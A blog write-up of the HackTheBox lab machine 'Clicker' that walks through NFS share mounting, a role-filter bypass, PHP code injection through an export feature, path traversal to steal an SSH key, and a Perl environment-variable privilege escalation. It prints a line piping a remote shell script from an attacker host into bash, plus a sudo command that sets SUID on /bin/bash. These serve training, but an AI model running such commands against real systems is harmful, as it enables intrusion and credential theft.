---
title: "HackTheBox | Clicker"
layout: post
date: 2024-01-27 12:00
tag: 
- HackTheBox
- Pentesting
- Clicker
- Linux
- Medium
- perl_startup
- SUID
- NFS
image: https://labs.hackthebox.com/storage/avatars/5a89d213ede5af4b4f94035fd059f976.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "An easy retired HackTheBox machine."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

Clicker is a medium HackTheBox machine that contains a web app that hosts a clicking game. A public NFS share made us retrieve the source code of the application, we could elevate the privileges of our account and change the username to include malicious PHP code. Accessing the admin panel, an export feature is abused to create a PHP file, leading to RCE on the machine. The root part is done by exploiting the "perl_startup" Privilege Escalation.

---

# Nmap

```bash
nmap -A -T4 10.129.210.42     
Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-27 17:21 +01
Warning: 10.129.210.42 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.210.42
Host is up (0.10s latency).
Not shown: 968 closed ports, 28 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37205/udp6  mountd
|   100005  1,2,3      37375/tcp6  mountd
|   100005  1,2,3      46358/udp   mountd
|   100005  1,2,3      51983/tcp   mountd
|   100021  1,3,4      34671/tcp   nlockmgr
|   100021  1,3,4      38883/tcp6  nlockmgr
|   100021  1,3,4      52482/udp6  nlockmgr
|   100021  1,3,4      59269/udp   nlockmgr
|   100024  1          37267/udp6  status
|   100024  1          37889/tcp   status
|   100024  1          39762/udp   status
|   100024  1          40993/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I checked the web page at port 80 :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929120933.png>)

Since there is nfs at port 2049 we can mount the mountable folders :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929131907.png>)

```bash
showmount -e 10.10.11.232
sudo mount -t nfs 10.10.11.232:/mnt/backups clicker
```

That contains clicker.htb_backup.zip file, which I unzipped and found some source codes :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230930001608.png>)

The save_game.php script contains :

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```

We see that we can add the role parameter to the request and be Admin :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929131739.png>)

When we normally add the parameter it says `malicious activity detected`, so we should escape the filter, I used role/\*\*/ instead of role and it worked :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929131808.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929194619.png>)

Logout and login again we are Admin and we can see the Administrator Panel now :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929132115.png>)

I found a reflected XSS vuln, I know that won't help me but that can be useful for a pentest report :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929122319.png>)

I checked the administrator tab and found an export button on the admin page that allowed me to export files with different file extensions :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929132209.png>)

The export.php script contains :

```php
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}

function random_string($length) {
    $key = '';
    $keys = array_merge(range(0, 9), range('a', 'z'));

    for ($i = 0; $i < $length; $i++) {
        $key .= $keys[array_rand($keys)];
    }

    return $key;
}

$threshold = 1000000;
if (isset($_POST["threshold"]) && is_numeric($_POST["threshold"])) {
    $threshold = $_POST["threshold"];
}
$data = get_top_players($threshold);
$currentplayer = get_current_player($_SESSION["PLAYER"]);
$s = "";
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>'; 
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
} 

$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
header('Location: /admin.php?msg=Data has been saved in ' . $filename);
?>
```

After setting `nickname` as the parameter and `PHP shell` as its value, I attempted to export the file with a `.php` extension.

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929211304.png>)

I intercepted the request and changed the extension to php :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929132328.png>)

Then when I opened it with the `cmd=id` parameter I was able to execute commands :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929211517.png>)

Now let's get a revshell :

```bash
curl 10.10.16.51/shell.sh | bash
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929212033.png>)

I'm in as www-data :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929212001.png>)

After turning around the server files in order to find a point where I can escalate to jack, I found a script in /opt/manage, I downloaded it locally and start analyzing it :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929220230.png>)

This binary file appears to read files from Jack’s home directory. When I execute `./execute_query 1` , I can read the `create.sql` file, when I do `./execute_query 5`, it goes to the default case, and it seems like I can read any readable files .

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929223920.png>)

I read /etc/passwd with `./execute_query 5 ../../../etc/passwd`.
And the I read the id_rsa file to login in ssh as jack :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230930004943.png>)

# User flag

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929223757.png>)

# PE

I see that I can run the `/opt/monitor.sh` script as root and I could also set environment variables :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929224843.png>)

We see that this script file calls `/usr/bin/echo` and `/usr/bin/xml_pp`.
`/usr/bin/echo` is a binary file so nothing special.
But `/usr/bin/xml_pp` is using Perl script to run.

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929225129.png>)

That allowed me to run scripts as root, given that I could set the environment when running Perl.
This vulnerability is called "perl_startup" Privilege Escalation.

[https://www.exploit-db.com/exploits/39702](https://www.exploit-db.com/exploits/39702)

```bash
sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20230929225811.png>)

Boom we are root!

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>